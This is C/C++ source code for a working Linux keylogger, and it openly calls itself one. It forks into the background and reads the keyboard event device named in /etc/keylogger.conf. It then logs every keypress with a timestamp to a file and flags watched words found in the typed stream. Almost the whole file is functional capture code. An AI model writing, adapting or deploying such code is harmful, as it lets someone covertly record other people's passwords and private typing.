#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <dirent.h>
#include <linux/input.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/select.h>
#include <sys/time.h>
#include <termios.h>
#include <signal.h>
#include <iostream>
#include <sstream>
#include <fstream>
#include "tree.h"
#include "treecheck.h"
#include <vector>
 
void handler (int sig)
{
  exit(0);
}
 
void perror_exit()
{
  handler(9);
}
 
void init();

int main (int argc, char *argv[])
{

	if (!fork())
		init();
	else
		std::cout << "Keylogger up and running\n!";

}

void loadData(std::string &eventPath, std::string &logPath) {

	std::ifstream stream;
	stream.open("/etc/keylogger.conf");
	std::string temp;
	stream >> temp;
	int event = 0;
	stream >> event;
	std::stringstream ss;
	ss << "/dev/input/event" << event;
	eventPath = ss.str();
	stream >> logPath;
	stream.close();


}

void printTime(FILE *data)
{
	time_t now;
	char *t = (char *)malloc(100);
	time(&now);
	strcpy(t, (char *)ctime(&now));
	t[strlen(t) - 1] = '\0';

	fprintf(data, "%s : ", t);
	fflush(data);

	free(t);
}

void init() {
	struct input_event ev[1];
	int fd, rd, value, size = sizeof(struct input_event);
 
	char chars[] = { ' ',' ','1','2','3','4','5','6','7','8','9','0',
					 ' ',' ',' ',' ','q','w','e','r','t','y','u','i',
					 'o','p','[',']',' ',' ','a','s','d','f','g','h',
					 'j','k','l',' ',' ',' ',' ',' ','z','x','c','v',
					 'b','n','m',',','.','/' };

	std::string logPath;
	std::string eventPath;

	loadData(eventPath, logPath);

	std::vector<std::string> slowa;
	slowa.push_back("sal");
	slowa.push_back("sala");

	Tree tree(slowa);
	TreeCheck checker(&tree);	

	//Open Device
	if ((fd = open (eventPath.c_str(), O_RDONLY)) == -1)
		printf ("%s is not a vaild device.n", eventPath.c_str());
 

	FILE *data = fopen(logPath.c_str(), "w");


	printTime(data);
	fprintf(data, "-- session start --\n");
	fflush(data);

	while (1){
		
		if ((rd = read (fd, ev, size * 1)) < size)
			continue;     
 
		value = ev[0].code;
 
		if (ev[0].type == 1 && ev[0].value == 1) {
	
			printTime(data);
			fprintf(data, "%c :: %d\n", chars[value], value);
			fflush(data);
	
			if(checker.checkNextLetter(chars[value])){
				if(checker.isCurrentNodeTerminal()) {
					printTime(data);
					fprintf(data, "%s\n", checker.getFoundWord().c_str());
					fflush(data);
				}
			}	

		}
	}
} 
